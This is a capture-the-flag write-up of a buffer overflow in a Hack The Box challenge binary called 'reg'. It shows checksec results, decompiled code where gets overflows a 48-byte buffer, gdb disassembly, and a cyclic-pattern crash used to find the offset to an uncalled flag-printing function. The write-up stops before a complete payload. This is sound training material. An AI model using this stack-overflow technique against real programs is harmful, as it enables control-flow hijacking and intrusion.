# Reg Write-up

Love buffer overflow practices. Lets get started

```shell
╰─ file reg                                                                           ─╯
reg: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=134349a67c90466b7ce51c67c21834272e92bdbf, for GNU/Linux 3.2.0, not stripped

╰─ gdb -q ./reg                                                                       ─╯
Reading symbols from ./reg...
(No debugging symbols found in ./reg)
gdb-peda$ checksec
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$
```

Get information with ghidra, found main who calls run function:

```code
undefined8 main(void)

{
  run();
  return 0;
}
```

run function has locat_38 48 char var and gets function, so lets bufferoverflow it

```code
void run(void)

{
  char local_38 [48];
  
  initialize();
  printf("Enter your name : ");
  gets(local_38);
  puts("Registered!");
  return;
}
```
this function is not called in the code, so we would never get to it. The plan is to use the gets buffer overflow to then point to the memory address of the winner function.

```code
void winner(void)

{
  char local_418 [1032];
  FILE *local_10;
  
  puts("Congratulations!");
  local_10 = fopen("flag.txt","r");
  fgets(local_418,0x400,local_10);
  puts(local_418);
  fclose(local_10);
  return;
}

```

gdb disassemble informatino:

```code
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x00000000004012ad <+0>:	push   rbp
   0x00000000004012ae <+1>:	mov    rbp,rsp
   0x00000000004012b1 <+4>:	mov    eax,0x0
   0x00000000004012b6 <+9>:	call   0x40126a <run>
   0x00000000004012bb <+14>:	mov    eax,0x0
   0x00000000004012c0 <+19>:	pop    rbp
   0x00000000004012c1 <+20>:	ret
End of assembler dump.
gdb-peda$ disassemble run
Dump of assembler code for function run:
   0x000000000040126a <+0>:	push   rbp
   0x000000000040126b <+1>:	mov    rbp,rsp
   0x000000000040126e <+4>:	sub    rsp,0x30
   0x0000000000401272 <+8>:	mov    eax,0x0
   0x0000000000401277 <+13>:	call   0x401196 <initialize>
   0x000000000040127c <+18>:	lea    rdi,[rip+0xd9d]        # 0x402020
   0x0000000000401283 <+25>:	mov    eax,0x0
   0x0000000000401288 <+30>:	call   0x401050 <printf@plt>
   0x000000000040128d <+35>:	lea    rax,[rbp-0x30]
   0x0000000000401291 <+39>:	mov    rdi,rax
   0x0000000000401294 <+42>:	mov    eax,0x0
   0x0000000000401299 <+47>:	call   0x401080 <gets@plt>
   0x000000000040129e <+52>:	lea    rdi,[rip+0xd8e]        # 0x402033
   0x00000000004012a5 <+59>:	call   0x401030 <puts@plt>
   0x00000000004012aa <+64>:	nop
   0x00000000004012ab <+65>:	leave
=> 0x00000000004012ac <+66>:	ret
End of assembler dump.
gdb-peda$ disassemble winner
Dump of assembler code for function winner:
   0x0000000000401206 <+0>:	push   rbp
   0x0000000000401207 <+1>:	mov    rbp,rsp
   0x000000000040120a <+4>:	sub    rsp,0x410
   0x0000000000401211 <+11>:	lea    rdi,[rip+0xdec]        # 0x402004
   0x0000000000401218 <+18>:	call   0x401030 <puts@plt>
   0x000000000040121d <+23>:	lea    rsi,[rip+0xdf1]        # 0x402015
   0x0000000000401224 <+30>:	lea    rdi,[rip+0xdec]        # 0x402017
   0x000000000040122b <+37>:	call   0x4010a0 <fopen@plt>
   0x0000000000401230 <+42>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401234 <+46>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401238 <+50>:	lea    rax,[rbp-0x410]
   0x000000000040123f <+57>:	mov    esi,0x400
   0x0000000000401244 <+62>:	mov    rdi,rax
   0x0000000000401247 <+65>:	call   0x401070 <fgets@plt>
   0x000000000040124c <+70>:	lea    rax,[rbp-0x410]
   0x0000000000401253 <+77>:	mov    rdi,rax
   0x0000000000401256 <+80>:	call   0x401030 <puts@plt>
   0x000000000040125b <+85>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040125f <+89>:	mov    rdi,rax
   0x0000000000401262 <+92>:	call   0x401040 <fclose@plt>
   0x0000000000401267 <+97>:	nop
   0x0000000000401268 <+98>:	leave
   0x0000000000401269 <+99>:	ret
End of assembler dump.
gdb-peda$

╰─ gdb ./reg                                                                          ─╯
GNU gdb (GDB) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./reg...
(No debugging symbols found in ./reg)
gdb-peda$ pattern create 70
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3'
gdb-peda$ run

Starting program: /home/darthv/git/badorius/vulnhub/hackthebox/Reg/Files/reg
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Enter your name : AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3
[----------------------------------registers-----------------------------------]
RAX: 0xc ('\x0c')
RBX: 0x7fffffffe078 --> 0x7fffffffe368 ("/home/darthv/git/badorius/vulnhub/hackthebox/Reg/Files/reg")
RCX: 0x7ffff7ea20b4 (<write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x1
RSI: 0x1
RDI: 0x7ffff7f85950 --> 0x0
RBP: 0x4147414131414162 ('bAA1AAGA')
RSP: 0x7fffffffdf58 ("AcAA2AAHAAdAA3")
RIP: 0x4012ac (<run+66>:	ret)
R8 : 0x0
R9 : 0x0
R10: 0x3
R11: 0x202
R12: 0x0
R13: 0x7fffffffe088 --> 0x7fffffffe3a3 ("SHELL=/bin/bash")
R14: 0x0
R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4012a5 <run+59>:	call   0x401030 <puts@plt>
   0x4012aa <run+64>:	nop
   0x4012ab <run+65>:	leave
=> 0x4012ac <run+66>:	ret
   0x4012ad <main>:	push   rbp
   0x4012ae <main+1>:	mov    rbp,rsp
   0x4012b1 <main+4>:	mov    eax,0x0
   0x4012b6 <main+9>:	call   0x40126a <run>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf58 ("AcAA2AAHAAdAA3")
0008| 0x7fffffffdf60 --> 0x334141644141 ('AAdAA3')
0016| 0x7fffffffdf68 --> 0x7ffff7dce290 (mov    edi,eax)
0024| 0x7fffffffdf70 --> 0x7fffffffe060 --> 0x7fffffffe068 --> 0x38 ('8')
0032| 0x7fffffffdf78 --> 0x4012ad (<main>:	push   rbp)
0040| 0x7fffffffdf80 --> 0x100400040
0048| 0x7fffffffdf88 --> 0x7fffffffe078 --> 0x7fffffffe368 ("/home/darthv/git/badorius/vulnhub/hackthebox/Reg/Files/reg")
0056| 0x7fffffffdf90 --> 0x7fffffffe078 --> 0x7fffffffe368 ("/home/darthv/git/badorius/vulnhub/hackthebox/Reg/Files/reg")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004012ac in run ()
gdb-peda$


```

AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGA
